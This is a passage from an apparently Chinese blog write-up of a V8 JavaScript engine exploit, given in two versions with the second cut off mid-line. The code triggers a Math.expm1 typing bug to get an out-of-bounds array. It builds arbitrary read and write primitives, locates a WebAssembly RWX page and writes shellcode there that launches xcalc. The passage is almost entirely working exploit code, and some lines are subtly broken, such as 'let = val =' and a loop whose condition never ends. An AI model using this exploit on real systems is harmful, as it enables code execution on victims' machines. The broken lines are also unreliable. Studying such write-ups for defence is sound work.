+<h2 id="wasm"><a href="#wasm" class="headerlink" title="wasm"></a>wasm</h2><p>wasmInstanceAddr到RWX区域的偏移为<code>0xe8</code>。</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span>(<span class="params">str, val</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] "</span> + str + <span class="string">" -&gt; "</span>+ hex(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2u(val)&#123;        <span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    u2f(val)&#123;        <span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tC = <span class="keyword">new</span> typeConvert();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> wasmFunc = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------start------------------------------</span></span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="keyword">var</span> oobArray = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">var</span> bufs = [];</span><br><span class="line"><span class="keyword">var</span> objs = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> tmp = &#123;<span class="attr">escape</span> : <span class="number">-0</span>&#125;;</span><br><span class="line">	<span class="keyword">let</span> idx = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), tmp.escape);</span><br><span class="line">	idx *= <span class="number">11</span>;</span><br><span class="line">	<span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">	<span class="keyword">let</span> b = [<span class="number">2.1</span>, <span class="number">2.2</span>, <span class="number">2.3</span>];</span><br><span class="line">	oobArray = b;</span><br><span class="line">	a[idx] = tC.u2f(<span class="number">0x200000000000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">	foo(<span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">-0</span>);</span><br><span class="line">success(<span class="string">"oobArray's length"</span>,oobArray.length);</span><br><span class="line"><span class="comment">//%DebugPrint(oobArray);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xdead</span>);</span><br><span class="line"><span class="keyword">let</span> obj=&#123;<span class="string">'a'</span>:<span class="number">0x1234</span>,<span class="string">'b'</span>:<span class="number">0x5678</span>&#125;;</span><br><span class="line"><span class="comment">//------------search-------------</span></span><br><span class="line"><span class="keyword">let</span> obj_b_offset;</span><br><span class="line"><span class="comment">// search obj.b offset</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = tC.f2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x123400000000</span>)&#123;</span><br><span class="line">		obj_b_offset = i + <span class="number">1</span>;</span><br><span class="line">		success(<span class="string">"obj.b"</span>, obj_b_offset);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// search buf's backing_store</span></span><br><span class="line"><span class="keyword">let</span> backing_store;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;maxSize;i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> = val = tC.f2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0xdead</span>)&#123;</span><br><span class="line">		backing_store = i + <span class="number">1</span>;</span><br><span class="line">		success(<span class="string">"buf's backing_store offset in oobArray"</span>,backing_store);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------build R/W Primitive-------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span>&#123;</span><br><span class="line">	leakObj(target)&#123;</span><br><span class="line">		obj.b = target;</span><br><span class="line">		<span class="keyword">return</span> tC.f2u(oobArray[obj_b_offset]) - <span class="number">0x1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	read(addr)&#123;</span><br><span class="line">		oobArray[backing_store] = tC.u2f(addr);</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">return</span> tC.f2u(tmp[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	write(addr,value)&#123;</span><br><span class="line">		oobArray[backing_store] = tC.u2f(addr);</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		tmp[<span class="number">0</span>] = tC.u2f(value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> wr = <span class="keyword">new</span> ArbitraryRW();</span><br><span class="line"><span class="comment">// ---------------build down -----------------</span></span><br><span class="line">wasmInsAddr = wr.leakObj(wasmInstance);</span><br><span class="line">success(<span class="string">"wasmIns_addr -&gt;"</span>,wasmInsAddr);</span><br><span class="line"><span class="comment">// %DebugPrint(wasmInstance);</span></span><br><span class="line">RWXAddr = wr.read(wasmInsAddr+<span class="number">0xe8</span>);</span><br><span class="line">success(<span class="string">"RWXAddr -&gt;"</span>,RWXAddr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCalc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> shellcode = [<span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3a</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;shellcode.length;i++)&#123;</span><br><span class="line">		wr.write(RWXAddr + i,shellcode[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	wasmFunc();</span><br><span class="line">&#125;</span><br><span class="line">showCalc();</span><br></pre></td></tr></table></figure>
+<p>另一版本在<code>ArbitraryRW</code>稍有不同。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span>(<span class="params">str, val</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] "</span> + str + <span class="string">" -&gt; "</span>+ hex(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2u(val)&#123;        <span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    u2f(val)&#123;        <span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tC = <span class="keyword">new</span> typeConvert();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> wasmFunc = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------start------------------------------</span></span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="keyword">var</span> oobArray = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">var</span> bufs = [];</span><br><span class="line"><span class="keyword">var</span> objs = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> tmp = &#123;<span class="attr">escape</span> : <span class="number">-0</span>&#125;;</span><br><span class="line">	<span class="keyword">let</span> idx = <span class="built_in">Object</span>.is(<span class="built_in">Math</span>.expm1(x), tmp.escape);</span><br><span class="line">	idx *= <span class="number">11</span>;</span><br><span class="line">	<span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">	<span class="keyword">let</span> b = [<span class="number">2.1</span>, <span class="number">2.2</span>, <span class="number">2.3</span>];</span><br><span class="line">	oobArray = b;</span><br><span class="line">	a[idx] = tC.u2f(<span class="number">0x200000000000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">	foo(<span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">-0</span>);</span><br><span class="line">success(<span class="string">"oobArray's length"</span>,oobArray.length);</span><br><span class="line"><span class="comment">//%DebugPrint(oobArray);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xdead</span>);</span><br><span class="line"><span class="keyword">let</span> obj=&#123;<span class="string">'a'</span>:<span class="number">0x1234</span>,<span class="string">'b'</span>:<span class="number">0x5678</span>&#125;;</span><br><span class="line"><span class="comment">//------------search-------------</span></span><br><span class="line"><span class="keyword">let</span> obj_b_offset;</span><br><span class="line"><span class="comment">// search obj.b offset</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = tC.f2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x123400000000</span>)&#123;</span><br><span class="line">		obj_b_offset = i + <span class="number">1</span>;</span><br><span class="line">		success(<span class="string">"obj.b"</span>, obj_b_offset);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// search buf's backing_store</span></span><br><span class="line"><span class="keyword">let</span> backing_store;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;maxSize;i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> = val = tC.f2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0xdead</span>)&#123;</span><br><span class="line">		backing_store = i + <span class="number">1</span>;</span><br><span class="line">		success(<span class="string">"buf's backing_store offset in oobArray"</span>,backing_store);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------build R/W Primitive-------------</span></span><br><span class="line"><span class="keyword">var</span> dataView = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span>&#123;</span><br><span class="line">	leakObj(target)&#123;</span><br><span class="line">		obj.b = target;</span><br><span class="line">		<span class="keyword">return</span> tC.f2u(oobArray[obj_b_offset]) - <span class="number">0x1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	read64(addr)&#123;</span><br><span class="line">		oobArray[backing_store] = tC.u2f(addr);</span><br><span class="line">		<span class="comment">//let tmp = new Float64Array(buf,0,0x10);</span></span><br><span class="line">		<span class="comment">//return tC.f2u(tmp[0]);</span></span><br><span class="line">		<span class="keyword">return</span> tC.f2u(dataView.getFloat64(<span 